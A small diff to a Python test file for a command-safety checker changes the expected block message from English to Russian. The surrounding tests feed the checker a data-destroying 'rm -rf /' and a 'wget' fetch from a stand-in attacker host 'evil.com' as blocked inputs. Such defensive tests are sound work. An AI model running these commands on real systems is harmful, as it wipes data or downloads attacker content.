@@ -104,5 +104,5 @@ class TestEnsureCommandSafe:
             ensure_command_safe("rm -rf /")
 
     def test_blocked_raises_message(self):
-        with pytest.raises(PermissionError, match="not allowed"):
+        with pytest.raises(PermissionError, match="не разрешена"):
             ensure_command_safe("wget http://evil.com")
